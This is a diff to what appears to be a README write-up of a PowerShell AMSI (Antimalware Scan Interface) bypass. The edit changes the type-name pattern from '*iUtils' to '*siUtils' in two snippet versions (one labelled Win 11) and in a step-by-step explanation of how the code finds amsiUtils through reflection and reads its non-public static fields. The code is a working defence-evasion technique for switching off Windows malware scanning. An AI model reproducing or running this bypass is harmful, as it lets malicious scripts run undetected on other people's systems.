@@ -9,7 +9,7 @@ Lots of people to thank for all the tech info so a full write up with screenshot
 
 ```
 $a=[Ref].Assembly.GetTypes();
-Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
+Foreach($b in $a) {if ($b.Name -like “*siUtils”) {$c=$b}};
 $d=$c.GetFields(‘NonPublic,Static’);
 Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
 $g=$f.GetValue($null);
@@ -21,7 +21,7 @@ $g=$f.GetValue($null);
 <b>Win 11 Version</b>
 ```
 $a=[Ref].Assembly.GetTypes();
-Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
+Foreach($b in $a) {if ($b.Name -like “*siUtils”) {$c=$b}};
 $d=$c.GetFields(‘NonPublic,Static’);
 Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
 $g=$f.GetValue($null);
@@ -96,7 +96,7 @@ $a=[Ref].Assembly.GetTypes();
 ```
 (Look for amsiUtils) Iterate over each type in $a. If the type's name matches the pattern *iUtils assign that type to the variable $c
 ```
-Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
+Foreach($b in $a) {if ($b.Name -like “*siUtils”) {$c=$b}};
 ```
 Get all non-public static fields of the type stored in $c and assigns them to $d    
 ```
